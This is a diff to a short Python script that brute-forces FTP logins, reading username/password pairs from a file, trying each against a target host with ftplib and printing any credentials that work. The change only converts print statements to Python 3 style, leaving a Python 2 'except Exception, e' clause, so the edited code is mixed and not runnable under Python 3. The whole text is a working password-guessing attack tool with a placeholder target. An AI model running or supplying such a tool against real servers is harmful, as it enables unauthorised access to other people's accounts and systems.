@@ -6,16 +6,16 @@ def bruteLogin(hostname, passwdFile):
 	time.sleep(1)
         userName = line.split(':')[0]
         passWord = line.split(':')[1].strip('\r').strip('\n')
-	print "[+] Trying: "+userName+"/"+passWord
+	print('[+] Trying: ' + userName + '/' + passWord)
         try:
             ftp = ftplib.FTP(hostname)
             ftp.login(userName, passWord)
-            print('\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + userName+"/" + passWord)
+            print('\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + userName + '/' + passWord)
             ftp.quit()
             return (userName, passWord)
         except Exception, e:
             pass
-    print '\n[-] Could not brute force FTP credentials.'
+    print('\n[-] Could not brute force FTP credentials.')
     return (None, None)
 
 host = '{ADD HOST IP}'
